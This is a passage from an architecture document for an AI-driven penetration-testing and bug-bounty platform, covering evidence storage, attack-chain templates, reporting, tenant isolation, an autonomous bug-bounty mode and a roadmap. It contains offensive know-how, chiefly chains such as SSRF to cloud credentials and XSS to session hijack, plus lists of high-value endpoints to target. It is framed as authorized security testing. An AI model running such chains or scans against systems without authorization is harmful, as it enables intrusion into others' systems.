    └── {tenant_id}/
        └── {engagement_id}/
            └── {finding_id}/
                ├── screenshots/
                │   ├── initial_state.png     — page before payload
                │   ├── payload_injected.png  — payload in place
                │   ├── exploitation.png      — alert/XSS firing
                │   └── full_context.png      — full page w/ annotations
                ├── http_logs/
                │   ├── attempt_1/
                │   │   ├── request.txt       — raw HTTP request
                │   │   └── response.txt      — raw HTTP response
                │   ├── attempt_2/
                │   └── attempt_3/
                ├── har/
                │   └── session.har           — full HAR log for browser PoCs
                ├── payload_results/
                │   └── validation.json       — structured validation results
                └── poc_script/
                    └── reproduce.sh          — self-contained reproduction script
```

### Evidence Metadata Schema

```json
{
  "finding_id": "F-A01-042",
  "engagement_id": "eng-2025-001",
  "tenant_id": "acme-corp",
  "vulnerability_type": "IDOR",
  "validation_timestamp": "2025-06-15T14:23:11Z",
  "validation_mode": "terminal",
  "attempts": [
    {
      "attempt_number": 1,
      "success": true,
      "duration_ms": 234,
      "request_hash": "sha256:abc...",
      "response_hash": "sha256:def...",
      "evidence_files": ["http_logs/attempt_1/request.txt", "http_logs/attempt_1/response.txt"]
    }
  ],
  "success_rate": 1.0,
  "confidence": 0.95,
  "screenshots": ["screenshots/exploitation.png"],
  "poc_script": "poc_script/reproduce.sh",
  "annotations": {
    "affected_parameter": "user_id",
    "attacker_account": "user_b@test.com",
    "victim_account": "user_a@test.com",
    "data_accessed": "profile fields (no PII extracted per engagement rules)"
  }
}
```

### Screenshot Annotation Pipeline

Browser-mode screenshots are automatically annotated:
- Red box overlay on the vulnerable element
- Arrow pointing to the payload location
- Timestamp and finding ID watermark
- Severity badge (color-coded: red/orange/yellow/blue)

Annotations are applied programmatically via Playwright's canvas API before saving.

### Replayable PoC Script Generation

For every VERIFIED finding, the system auto-generates a `reproduce.sh` script that:
- Contains only `curl` commands (no tool dependencies)
- Is fully self-contained with comments explaining each step
- Includes setup notes (auth tokens to replace, environment vars)
- Has an expected output section for validation

This script is included verbatim in all reports.

---

## 10. Attack Chain Intelligence

### Chain Detection Architecture

The AttackGraphAgent queries the asset graph for vulnerability co-location patterns and applies known attack chain templates. This is a hybrid: templates are deterministic, chain prioritization is AI-assisted.

### Attack Chain Template Library

```
CHAIN ID    NAME                     COMPONENTS                        IMPACT
────────────────────────────────────────────────────────────────────────────────────
AC-001      IDOR → ATO              IDOR (read) + session fixation     Account Takeover
AC-002      SSRF → IMDS             SSRF + cloud IMDS endpoint         Cloud Credentials
AC-003      XSS → Session Hijack    XSS (stored) + no HttpOnly         Account Takeover
AC-004      SQLi → Auth Bypass      SQLi (auth form) + admin table     Full Admin Access
AC-005      Open Redirect → SSRF    Open Redirect + internal SSRF      SSRF via redirect
AC-006      CORS → CSRF             CORS wildcard + CSRF target        State Change
AC-007      Subdomain TKO → XSS     Subdomain takeover + cookie        Cookie Theft
AC-008      JWT None Alg → IDOR     JWT alg=none + IDOR endpoint       Privilege Escalation
AC-009      XXE → SSRF              XXE with external entity + SSRF    Internal Port Scan
AC-010      Mass Assign → PrivEsc   Mass Assignment + role field        Admin Privilege
```

### Graph Query Engine for Chain Discovery

The chain detector runs Cypher queries (Neo4j) against the vulnerability graph to find chains:

```
For each verified vulnerability V1:
  1. Find all other verified vulnerabilities V2 where:
     - V2 is accessible using credentials/session obtained from V1
     OR
     - V2 is on an asset reachable from V1's host
     OR
     - V1's impact class matches a prerequisite for a known template
  2. Compute chain exploitability score
  3. Compute combined business impact
  4. If score > threshold → create AttackChain node
```

### Attack Chain Scoring

```
chain_score = max(component_severity) × chain_length_multiplier
            + combined_data_impact × 0.4
            + authentication_required_penalty × 0.2

chain_length_multiplier:
  1 step  → 1.0
  2 steps → 1.3
  3 steps → 1.6
  4+ steps→ 2.0
```

### AI Chain Narrative Generation

For each confirmed chain, the AI agent produces:
- A 2-paragraph plain-English explanation suitable for executive report
- A numbered step-by-step technical attack walkthrough
- Business impact statement referencing the specific data/systems at risk
- Remediation priority: which component to fix first to break the chain

---

## 11. Reporting Engine

### Report Generation Pipeline

```
┌──────────────────────────────────────────────────────────────────┐
│                    REPORTING ENGINE                               │
└──────────────────────────────────────────────────────────────────┘

Data Sources
├── Vulnerability graph (all CONFIRMED findings)
├── Evidence S3 (screenshots, HTTP logs, PoC scripts)
├── Attack chains (ranked by severity)
└── Engagement metadata (scope, dates, tester info)
          │
          ▼
Report Assembler
├── EXECUTIVE SUMMARY
│   ├── Risk posture score (0-100)
│   ├── Critical/High/Medium/Low finding counts
│   ├── Top 3 attack chains with business impact
│   └── AI-generated risk narrative (2-3 paragraphs)
│
├── TECHNICAL REPORT
│   ├── Methodology section (PTES phases run)
│   ├── Scope and exclusions
│   ├── Full finding table (sorted by CVSS)
│   └── Attack chain diagrams (Mermaid/Graphviz → rendered PNG)
│
└── PER-FINDING SECTIONS (one per CONFIRMED vuln)
    ├── Finding ID, title, severity, CVSS vector string
    ├── OWASP Top 10 mapping + CWE
    ├── Affected assets
    ├── Vulnerability description
    ├── Steps to reproduce (from PoC script)
    ├── Evidence (screenshots embedded, HTTP logs linked)
    ├── Business impact
    └── Remediation recommendations (specific, not generic)

          │
          ▼
Format Renderers
├── HTML  → Jinja2 template → WeasyPrint → PDF
├── PDF   → Direct WeasyPrint render
├── Email → Per-finding HTML (EMAIL_REPORT_TEMPLATE format)
└── JSON  → Machine-readable for API / integrations
```

### Bug Bounty Submission Format

A special `BugBountyFormatter` renders each finding in the standard format required by HackerOne and Bugcrowd:

- Summary (1-2 sentences)
- Steps to Reproduce (numbered, with exact requests)
- Expected behavior
- Actual behavior
- Impact statement
- Severity justification (CVSS breakdown)
- Supporting attachments (screenshots, HTTP logs)

The formatter can output Markdown (HackerOne) or HTML (Bugcrowd) and respects each platform's word count constraints.

### Attack Chain Diagrams

Attack chains are rendered as directed graphs using Mermaid syntax, then converted to PNG for embedding in PDF/HTML reports:

```mermaid
graph LR
  A[Unauthenticated<br/>IDOR on /api/users/ID] -->|Returns full<br/>profile + session token| B
  B[Session Token<br/>from Victim Account] -->|Used to auth| C
  C[Admin Panel<br/>/admin/dashboard] -->|Grants full<br/>system access| D[FULL ACCOUNT<br/>TAKEOVER]
  style A fill:#ff4444
  style D fill:#ff0000
```

---

## 12. SaaS Security Platform Architecture

### Multi-Tenant Architecture

```
┌────────────────────────────────────────────────────────────────────────────┐
│                      SAAS PLATFORM — DEPLOYMENT VIEW                        │
└────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│                   CONTROL PLANE                      │
│                                                       │
│  ┌─────────────────┐    ┌──────────────────────┐     │
│  │   API Server    │    │    Web Dashboard      │     │
│  │   (FastAPI)     │    │    (Next.js)          │     │
│  │                 │    │                       │     │
│  │  /api/v1/       │    │  - Engagement mgmt    │     │
│  │   engagements   │    │  - Live scan status   │     │
│  │   findings      │    │  - Finding review     │     │
│  │   reports       │    │  - Report download    │     │
│  │   tenants       │    │  - Attack chain viz   │     │
│  └────────┬────────┘    └────────────────────── ┘     │
│           │                                            │
│           ▼                                            │
│  ┌──────────────────────────────────────────────────┐ │
│  │              Authentication Layer                  │ │
│  │   OAuth2 / OIDC (Auth0 / Keycloak)                │ │
│  │   Multi-tenant JWT with tenant_id claim           │ │
│  │   RBAC: Admin / Pentester / Viewer roles          │ │
│  └──────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────┐
│                   DATA PLANE                          │
│                                                       │
│  ┌────────────────────────────────────────────────┐  │
│  │           Scan Scheduler Service                │  │
│  │  - Receives engagement requests from API        │  │
│  │  - Allocates worker capacity per tenant         │  │
│  │  - Enforces tenant resource quotas              │  │
│  │  - Routes tasks to appropriate worker pools     │  │
│  └──────────────────────┬─────────────────────────┘  │
│                         │                             │
│                         ▼                             │
│  ┌────────────────────────────────────────────────┐  │
│  │           Worker Node Pool                      │  │
│  │                                                  │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │  │
│  │  │ Recon    │  │  Scan    │  │  Validation  │  │  │
│  │  │ Workers  │  │  Workers │  │  Workers     │  │  │
│  │  │(Docker)  │  │(Docker)  │  │  (Docker)    │  │  │
│  │  └──────────┘  └──────────┘  └──────────────┘  │  │
│  │                                                  │  │
│  │  Each worker runs in isolated Docker container   │  │
│  │  with NO network access outside scope            │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────┐
│                   STORAGE PLANE                       │
│                                                       │
│  ┌──────────────┐  ┌──────────────┐  ┌────────────┐  │
│  │  PostgreSQL  │  │  Neo4j       │  │  S3/MinIO  │  │
│  │  (RDS Multi- │  │  (Graph DB)  │  │  (Evidence │  │
│  │   AZ)        │  │              │  │   Store)   │  │
│  │              │  │  Tenant      │  │            │  │
│  │  Row-level   │  │  isolation   │  │  Bucket    │  │
│  │  security    │  │  via label   │  │  per tenant│  │
│  │  per tenant  │  │  partitions  │  │            │  │
│  └──────────────┘  └──────────────┘  └────────────┘  │
└─────────────────────────────────────────────────────┘
```

### Tenant Isolation Model

**Storage isolation**: PostgreSQL uses Row-Level Security (RLS) with `tenant_id` on every table. Every query from the API server is executed with a session variable set to the authenticated tenant's ID. Queries missing tenant context fail at the database level.

**Compute isolation**: Each engagement scan runs in a dedicated Docker container. Containers are network-isolated: they can only reach the target scope (enforced via iptables rules injected at container start). Containers share no filesystem state between tenants.

**Evidence isolation**: Each tenant has a dedicated S3 prefix (`s3://platform-evidence/{tenant_id}/`). IAM policies enforce that tenant API keys can only access their own prefix.

### Resource Quota System

```yaml
tenant_tiers:
  starter:
    max_concurrent_scans: 1
    max_assets_per_scan: 50
    worker_pool_share: 5%
    evidence_storage_gb: 10
    report_retention_days: 30

  professional:
    max_concurrent_scans: 5
    max_assets_per_scan: 500
    worker_pool_share: 20%
    evidence_storage_gb: 100
    report_retention_days: 90

  enterprise:
    max_concurrent_scans: unlimited
    max_assets_per_scan: unlimited
    worker_pool_share: dedicated_pool
    evidence_storage_gb: unlimited
    report_retention_days: 365
```

### Authorization Enforcement Layer

Before any scan begins, the platform verifies:

1. **Signed authorization document** (ROE) uploaded and acknowledged
2. **Scope validation**: all targets pass the authorized domain/IP list check
3. **Conflict check**: no other tenant is currently scanning the same target IP space
4. **Legal compliance flag**: GDPR / CCPA implications acknowledged for EU/CA targets

Scans without all 4 checks passing are rejected at the API level before a single tool executes.

---

## 13. Bug Bounty Hunter Mode

### Mode Differentiation

```
                    ENTERPRISE MODE vs BUG BOUNTY MODE
                    ────────────────────────────────────

DIMENSION           ENTERPRISE PENTESTING      BUG BOUNTY HUNTING
──────────────────────────────────────────────────────────────────────────────
Scope               Defined IP/domain list     Wildcard programs (*.target.com)
Target count        10-100 assets              10,000+ potential subdomains
Scan depth          Deep, all endpoints        Broad first, then deep on juicy
Primary vulns       All OWASP Top 10           IDOR, SSRF, RCE, Auth Bypass
Auth testing        All roles provided         External attacker perspective
Time limit          Engagement window          Continuous / no deadline
Priority            Comprehensive coverage     High-value findings only
Output              Full technical report      Per-finding bug report
Rate limiting       Conservative (client req)  Aggressive (program allows)
Dedup               Within engagement          Against public disclosures DB
```

### Bug Bounty Mode Configuration

```yaml
mode: bug_bounty

bug_bounty:
  program: "acme-corp"
  platform: "hackerone"  # or: bugcrowd, intigriti, self-hosted
  program_url: "https://hackerone.com/acme-corp"

  priority_findings:
    - IDOR
    - SSRF
    - RCE
    - AUTH_BYPASS
    - ACCOUNT_TAKEOVER
    - SQLi
    - STORED_XSS

  deprioritized:
    - MISSING_SECURITY_HEADERS     # out of scope for most programs
    - SELF_XSS                     # not accepted
    - RATE_LIMITING_COSMETIC       # low reward, high time cost
    - SSL_WEAK_CIPHER              # common, low reward

  scan_strategy: "high_value_first"
  max_subdomains: 50000
  js_analysis: deep
  parameter_mining: aggressive

  dedup_check:
    enabled: true
    sources:
      - hackerone_disclosed        # check HackerOne disclosed reports
      - local_history              # previous submissions
```

### High-Value Target Identification

Bug Bounty mode applies a target priority scoring model to focus scanning effort:

```
HIGH VALUE SIGNALS (scan these first):
  → Admin panels (/admin, /dashboard, /console, /management)
  → API versioned endpoints (/api/v1/, /api/v2/ — version differentials)
  → Account/user endpoints (/api/users/, /account/, /profile/)
  → Payment flows (/checkout, /payment, /billing, /subscription)
  → File operations (/upload, /download, /export, /import)
  → Internal tools (/debug, /metrics, /health, /internal)
  → Webhooks and callbacks (/webhook, /callback, /notify)
  → GraphQL endpoints (/graphql, /api/graphql)
  → OAuth flows (/oauth, /auth/callback, /connect)

LOW VALUE SIGNALS (deprioritize):
  → Static marketing pages
  → Documentation pages
  → CDN-served assets
  → Error pages
```

### Continuous Monitoring Submode

In bug bounty mode, the recon engine runs in a continuous loop:

```
Every 6 hours:
  1. Re-run subdomain discovery → compare with previous snapshot
  2. New subdomains → immediately enter full scan pipeline (HIGH priority)
  3. Changed endpoints (content hash delta) → re-scan those endpoints only
  4. New JS files → extract endpoints → parameter mine → vulnerability check
  5. Emit alert if new high-value asset discovered
```

New attack surface = highest probability of undiscovered vulnerabilities. This mirrors the operational model of top bug bounty earners who monitor target programs continuously and pounce on newly deployed endpoints.

### Deduplication Against Public Disclosures

Before submitting any finding, the platform checks:

1. HackerOne disclosed reports API (program-specific)
2. Local submission history (this researcher × this program)
3. CVE/NVD database for known CVEs in identified software versions
4. Fuzzy text matching against description corpus

Findings with >80% similarity to known disclosures are flagged DUPLICATE and excluded from the submission queue.

---

## 14. Upgrade Roadmap

### Phase 1 — Foundation (Months 1-3)

```
Priority: Replace flat JSON knowledge base with graph database
          Implement message broker (Redis Streams)
          Build parallel worker pool infrastructure
          Migrate existing agents to new base class with typed I/O

Deliverables:
  ✓ Neo4j asset graph with full schema
  ✓ Redis-backed task queues for all phases
  ✓ Docker-based worker pool (recon + scan + validation)
  ✓ Authorization guard at scope enforcement layer
  ✓ Token optimization: context slicing + structured outputs
```

### Phase 2 — Intelligence (Months 4-6)

```
Priority: Payload Intelligence Engine
          Advanced validation engine (3-attempt + confidence scoring)
          Automated attack chain detection
          Embedding-based vulnerability KB

Deliverables:
  ✓ Payload library with sink-aware XSS generation
  ✓ WAF fingerprinting + mutation engine
  ✓ ExploitValidationAgent with interactsh integration
  ✓ AttackGraphAgent with 10 chain templates
  ✓ Vector embedding store for vuln KB
```

### Phase 3 — Autonomy (Months 7-9)

```
Priority: Full autonomous operation without human prompting mid-scan
          Bug Bounty Hunter mode
          Continuous monitoring loop
          Professional reporting pipeline

Deliverables:
  ✓ Master orchestrator with full phase sequencing
  ✓ Bug Bounty mode with program-aware deduplication
  ✓ Continuous subdomain monitoring with delta detection
  ✓ PDF/HTML report generation with attack chain diagrams
  ✓ Bug bounty submission formatter (HackerOne + Bugcrowd)
```

### Phase 4 — SaaS (Months 10-12)

```
Priority: Multi-tenant platform
          Web dashboard
          API server
          Enterprise security controls

Deliverables:
  ✓ FastAPI REST API with multi-tenant auth
  ✓ Next.js dashboard with live scan visualization
  ✓ PostgreSQL RLS + S3 tenant isolation
  ✓ Resource quota system (starter/professional/enterprise)
  ✓ Authorization enforcement layer (ROE upload + scope validation)
  ✓ Webhook integrations (Jira, Slack, PagerDuty)
```

### Phase 5 — Scale (Months 13-18)

```
Priority: Enterprise scale (10,000+ asset engagements)
          Advanced AI capabilities
          Compliance reporting (SOC2, PCI-DSS, ISO 27001 mapping)
          API for third-party integrations

Deliverables:
  ✓ Kubernetes-based auto-scaling worker pools
  ✓ Kafka migration for high-throughput task streaming
  ✓ Compliance report templates (NIST, SOC2, PCI)
  ✓ REST API for SIEM integration (Splunk, Elastic)
  ✓ Fine-tuned vulnerability triage model (local, token-free)
  ✓ Federated deployment option for air-gapped enterprises
```

### Architecture Migration from Current System

```
CURRENT → NEXT-GEN MAPPING

Current Component          → New Component
────────────────────────────────────────────────────────────────
data/*.json                → Neo4j graph database
core/knowledge_base.py     → GraphSyncWorker + Neo4j driver
core/orchestrator.py       → Master Orchestrator + task queues
core/tool_integrations.py  → Tool wrapper library (dockerized)
agents/*.py                → Capability-based agents (v2 schema)
evidence/ (local)          → S3/MinIO evidence store
reports/ (local)           → Report generation service + S3
logs/*.log                 → Elasticsearch + structured logging
config.yaml                → config.yaml + API-managed config store
setup.py                   → API server + web dashboard
run.py                     → Orchestrator CLI (preserved)
```

---

## Appendix: Tool Orchestration Reference

```
TOOL              PHASE      EXECUTION MODEL     OUTPUT FORMAT
─────────────────────────────────────────────────────────────────────────────
subfinder         recon      subprocess, async   JSON lines (subdomains)
amass             recon      subprocess, async   JSON (subdomain + source)
dnsx              recon      subprocess, async   JSON lines (DNS records)
httpx             recon      subprocess, async   JSON lines (HTTP metadata)
naabu             recon      subprocess, async   JSON lines (ports)
gau               recon      subprocess, async   plain URLs
katana            recon      subprocess, async   JSON lines (URLs)
hakrawler         recon      subprocess, async   plain URLs
paramspider       enum       subprocess, async   URL+param patterns
arjun             enum       subprocess, async   JSON (params per endpoint)
ffuf              enum       subprocess, async   JSON (hits)
nuclei            vuln       subprocess, async   JSON lines (findings)
sqlmap            vuln       subprocess, sync    JSON (injection data)
jwt_tool          vuln       subprocess, sync    text (analysis)
sslyze            vuln       subprocess, sync    JSON (SSL results)
subjack           recon      subprocess, async   text (takeover findings)
interactsh        validation subprocess, async   HTTP callback events
playwright        validation Python API, async   screenshots + DOM state
curl              validation subprocess, sync    raw HTTP response
```

---

*This architecture document describes a system for authorized security testing only. All engagements must have prior written authorization. The platform enforces scope boundaries, authorization checks, and safe-mode tool constraints at every layer.*
